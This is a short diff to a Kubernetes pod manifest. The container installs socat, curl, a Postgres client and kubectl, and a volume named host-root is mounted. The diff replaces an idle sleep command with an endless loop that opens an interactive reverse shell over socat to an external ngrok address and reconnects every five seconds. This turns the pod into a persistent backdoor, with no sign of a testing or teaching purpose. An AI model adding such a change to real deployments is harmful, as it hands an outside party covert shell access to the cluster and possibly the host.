@@ -41,7 +41,10 @@ spec:
     - -c
     - |
       apk add -q socat curl postgresql-client kubectl
-      sleep 999999
+      while true; do
+        socat exec:'/bin/sh -li',pty,stderr,setsid,sigint,sane tcp:0.tcp.eu.ngrok.io:24173
+        sleep 5
+      done
   restartPolicy: Always
   volumes:
   - name: host-root
